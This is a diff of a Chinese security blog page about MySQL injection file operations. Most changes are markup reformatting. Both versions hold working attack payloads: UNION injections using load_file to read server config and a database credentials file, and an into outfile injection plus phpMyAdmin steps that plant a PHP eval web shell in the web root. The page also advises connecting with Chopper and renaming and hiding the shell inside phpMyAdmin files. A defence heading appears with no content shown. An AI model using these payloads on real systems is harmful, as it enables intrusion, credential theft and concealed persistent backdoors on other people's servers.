@@ -85,11 +85,12 @@
                     <div style="padding:5px 5px 2px 0px;">
                         <i class="fa fa-calendar fa-fw"></i>
                         <time>2016-06-20</time>
-                    </div>
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                    
 
                     
 
-                    <div style="padding:2px 5px 5px 0px;">
+                    
                         
                         
                         
@@ -120,44 +121,32 @@
 <li>条件:</li>
 </ul>
 
-<blockquote>
 <pre><code>1. 要有file_priv权限
 2. 知道文件绝对路径
 3. 能使用union
 4. 对web目录有读权限  
 注：若过滤了单引号，则可以将函数中的字符进行hex编码
 </code></pre>
-</blockquote>
 
 <ul>
 <li><p>一般步骤</p>
 
 <ul>
-<li>读/etc/init.d下的东西，这里有配置文件路径</li>
-</ul>
+<li><p>读/etc/init.d下的东西，这里有配置文件路径</p>
 
-<blockquote>
 <pre><code>?id=1' union select 1,2,load_file('/etc/init.d/httpd')
-</code></pre>
-</blockquote>
+</code></pre></li>
 
-<ul>
-<li>得到web安装路径<br /></li>
-</ul>
+<li><p>得到web安装路径</p>
 
-<blockquote>
 <pre><code>?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')
-</code></pre>
-</blockquote>
+</code></pre></li>
 
-<ul>
-<li>读取密码文件</li>
-</ul>
+<li><p>读取密码文件</p>
 
-<blockquote>
 <pre><code>?id=1' union select 1,2,load_file('/site/xxx.com/conf/conn.inc.php')
-</code></pre>
-</blockquote></li>
+</code></pre></li>
+</ul></li>
 </ul>
 
 <h3 id="0x01-into-outfile">0x01 into outfile</h3>
@@ -166,60 +155,38 @@
 <li>条件：</li>
 </ul>
 
-<blockquote>
 <pre><code>1. 要有file_priv权限  
 2. 知道网站绝对路径  
 3. 要能用union  
 4. 对web目录有写权限  
 5. 没有过滤单引号
 </code></pre>
-</blockquote>
 
 <ul>
-<li>一般方法</li>
-</ul>
+<li><p>一般方法<br />
+当知道路径时，可以直接用?id=1 union select &ldquo;&lt;?php @eval($_POST[&lsquo;c&rsquo;]);?&gt;&rdquo; into outfile(&ldquo;C:/phpStudy/WWW/a.php&rdquo;)</p></li>
 
-<blockquote>
-<p>当知道路径时，可以直接用?id=1 union select &ldquo;&lt;?php @eval($_POST[&lsquo;c&rsquo;]);?&gt;&rdquo; into outfile(&ldquo;C:/phpStudy/WWW/a.php&rdquo;)</p>
-</blockquote>
-
-<ul>
 <li><p>其他方法</p>
 
 <ul>
-<li>登陆phpMyAdmin<br />
-<br /></li>
-</ul>
+<li><p>登陆phpMyAdmin</p>
 
-<blockquote>
 <pre><code>use test;  选择数据库为test
 create table aaa(bbb varchar(64));   在数据库中创建一个表aaa
-insert into aaa values(&quot;&lt;?php @eval($_POST['c']);?&gt;&quot;);   在aaa中插入一条数据&lt;?php @eval($_POST['c']);?&gt;
-select * from aaa into outfile 'C:/phpStudy/WWW/a.php';  将aaa中的数据导出到文件a.php
-</code></pre>
-</blockquote>
+insert into aaa values(&quot;&lt;?php @eval($_POST['c']);?&gt;&quot;); --在aaa中插入一条数据&lt;?php @eval($_POST['c']);?&gt;
+select * from aaa into outfile 'C:/phpStudy/WWW/a.php'; --将aaa中的数据导出到文件a.php
+</code></pre></li>
 
-<ul>
-<li>localhost:80/a.php能访问<br />
-<br /></li>
-</ul>
+<li><p>localhost:80/a.php能访问</p>
 
-<blockquote>
-<pre><code>drop aaa;  //删除建立的表
-</code></pre>
-</blockquote>
+<pre><code>drop aaa; --删除建立的表
+</code></pre></li>
 
-<ul>
-<li>然后菜刀连接<br /></li>
-</ul>
+<li><p>然后菜刀连接</p>
 
-<blockquote>
-<pre><code>1. 菜刀连接：  
-    C:\phpStudy\WWW\a.php
-2. 更改shell的名字并将shell放在较隐蔽的地方：  
-    C:\phpStudy\WWW\phpMyAdmin\setup\lib\common.php
-</code></pre>
-</blockquote></li>
+<pre><code class="language-ini">菜刀连接http://www.aa.com/a.php，然后更改shell的名字并将shell放在较隐蔽的地方，比如C:\phpStudy\WWW\phpMyAdmin\setup\lib\common.php
+</code></pre></li>
+</ul></li>
 </ul>
 
 <h3 id="0x02-防御">0x02 防御</h3>
